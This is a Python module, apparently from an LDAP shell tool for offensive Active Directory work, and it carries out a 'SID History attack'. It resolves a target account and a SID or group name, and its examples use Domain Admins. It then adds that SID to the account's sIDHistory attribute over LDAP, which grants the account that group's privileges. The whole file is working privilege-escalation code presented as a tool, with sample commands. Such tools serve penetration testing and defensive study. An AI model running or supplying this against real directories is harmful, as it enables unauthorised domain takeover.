import logging
import re

from ldap3 import MODIFY_ADD, Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field

from ldap_shell.ldap_modules.base_module import ArgumentType, BaseLdapModule
from ldap_shell.utils.ldap_utils import LdapUtils

SID_RE = re.compile(r'^S-\d+(-\d+)+$', re.I)


class LdapShellModule(BaseLdapModule):
    """Add a SID to sIDHistory (needs write on sIDHistory; SID filtering off on trust)"""

    help_text = "Add a SID to an account sIDHistory (SID History attack)"
    examples_text = """
    `add_sid_history john.doe S-1-5-21-111-222-333-512`
    `add_sid_history john.doe "Domain Admins"`
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Account that receives sIDHistory",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER]
        )
        sid_or_group: str = Field(
            description="SID or a group/user name to resolve in this forest",
            arg_type=ArgumentType.STRING
        )

    def __init__(self, args_dict: dict, domain_dumper: domainDumper, client: Connection, log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def _resolve_sid(self, value: str) -> str:
        if SID_RE.match(value):
            return value
        sid = LdapUtils.get_sid(self.client, self.domain_dumper, value)
        if not sid:
            raise ValueError(f'Cannot resolve SID for {value}')
        return sid

    def __call__(self):
        target_dn = LdapUtils.resolve_dn(self.client, self.domain_dumper, self.args.target)
        if not target_dn:
            self.log.error('Target not found: %s', self.args.target)
            return
        try:
            sid = self._resolve_sid(self.args.sid_or_group)
        except ValueError as exc:
            self.log.error('%s', exc)
            return
        ok = self.client.modify(target_dn, {'sIDHistory': [(MODIFY_ADD, [sid])]})
        if ok:
            self.log.info('Added %s to sIDHistory of %s', sid, target_dn)
        else:
            self.log.error('Failed to set sIDHistory: %s', self.client.result)
